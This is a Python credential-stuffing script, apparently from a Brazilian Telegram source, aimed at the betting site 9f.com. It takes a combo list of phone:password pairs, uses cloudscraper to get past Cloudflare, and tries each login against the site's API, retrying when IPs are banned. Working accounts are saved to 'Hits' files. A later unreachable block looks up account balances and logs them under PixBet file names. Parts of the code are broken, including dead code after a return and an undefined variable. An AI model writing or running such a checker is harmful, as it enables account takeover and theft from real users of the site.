import cloudscraper
import inquirer
import os
from colorama import Fore
import subprocess
import platform
import hashlib


h = {"Host": "www.9f.com",
"Accept": "application/json, text/plain, */*",
"accept-encoding": "gzip, deflate, br, zstd",
"accept-language": "pt-BR,pt;q=0.9",
"Content-Type": "application/json",
"reCAPTCHA_Token": "null",
"X-Lat": "null",
"X-Long": "null",
"Origin": "https://9f.com",
"sec-fetch-dest": "empty"
}

def info(f,h,r):
    if platform.system() == "Windows":
        title = f'9F @WAFCLOUD - Hits: {h} Fails: {f} Retest: {r}'
        subprocess.call(['title', title], shell=True)
    else:
        print("Contado off")

def login(x,d):
    
    global fails,hits,retest

    if d.count(':') != 1:
        
        print('ALGUM ERRO NA LINHA:',d)
            
        return
    
    email, senha = d.split(':')
    
    senha = hashlib.md5(senha.encode()).hexdigest()
    
    j = {"phone":f"55{email}","password":senha,"platform":3}
    while True:
        
        c = cloudscraper.create_scraper()
        
        try:
            r = c.post('https://www.9f.com/api/kaya/login', json=j, headers=h, timeout=10)
        except:
            retest += 1
            info(fails,hits,retest)
            continue
        
        if 'bizCode":1,"msg":nul' in r.text:
            hits += 1
            info(fails,hits,retest)
            print(Fore.GREEN+f'Sucesso | {x} - {d}'+Fore.RESET)
            
            with open('Hits/9F-Sem.txt', 'a',encoding='utf-8',errors='ignore') as g:
                    g.write(f'{d}\n')
            break
            
        elif 'O número de telefone não existe' in r.text or 'The phone number doesn' in r.text:
            fails += 1
            info(fails,hits,retest)
            
            print(Fore.RED+f'FAIL | {x} - {d}'+Fore.RESET)
            
            break
        
        elif r.status_code == 403:
            retest += 1
            info(fails,hits,retest)
            print(f'CLOUDFLARE |',x,d)
        
        elif r.status_code == 429:
            retest += 1
            info(fails,hits,retest)
            print(f'IP Banido |',x,d)
            continue
        
        else:
            retest += 1
            info(fails,hits,retest)
            print('NOVO ERRO |',x,d, r.status_code)
            break
        
        return
    
        try:
            r = c.get('https://www.9f.com/api/kaya/user/info', headers=h and mx, timeout=10)
            print(r.text)
        except:
            retest += 1
            info(fails,hits,retest)
            continue
        
        if 'chip' in r.text:
            hits += 1
            info(fails,hits,retest)
            v = r.json()['chip']
            
            print(v)
            
            if float(v) < 0.00:
                
                print(f'Sucesso | {x} - {d} Saldo: {v}')
                with open('Hits/PixBet-Saldo.txt', 'a',encoding='utf-8',errors='ignore') as g:
                    g.write(f'{d} | Saldo: {v}\n')
                break
            
            else:
                
                print(Fore.GREEN+f'Sucesso | {x} - {d} | Saldo: {v}'+Fore.RESET)
            
                with open('Hits/PixBet-Sem.txt', 'a',encoding='utf-8',errors='ignore') as g:
                    g.write(f'{d} | Saldo: {v}\n')

                    break
                
        elif r.status_code == 403:
            retest += 1
            info(fails,hits,retest)
            print(f'CLOUDFLARE |',x,d)
            
        else:
            hits += 1
            info(fails,hits,retest)
            print(Fore.YELLOW+f'Custom | {x} - {d}'+Fore.RESET)
            break


def main():
    
    aq = [inquirer.List('k', message='Escolha', choices=[arquivo for arquivo in os.listdir() if arquivo.endswith('.txt') or arquivo.endswith('.csv')])]
    try:
        aq = inquirer.prompt(aq)['k']
        
        os.system('cls')
        
        with open(aq, 'r',encoding='utf-8', errors='ignore') as xx:
            xx = xx.read().splitlines()
        
    except:
        
        print('Burro, Aprenda a escolher')
        return
    
    
    if len(xx) == 0:
        print('Esta Louco arquivo vazio')
        
        return
        
    for x, d in enumerate(xx, start=1):
        login(x, d)
    
    
if __name__ == '__main__':
    
    fails = 0
    hits = 0
    retest = 0
    
    os.system(f'title 9F @WAFCLOUD')
    
    if not os.path.exists('Hits'):
        os.makedirs('Hits')
    
    try:
        main()
        input('\nFechar: ')
    except Exception as e:
        print('Erro:', e)
        
#By Creator https://t.me/Unkn0wnGun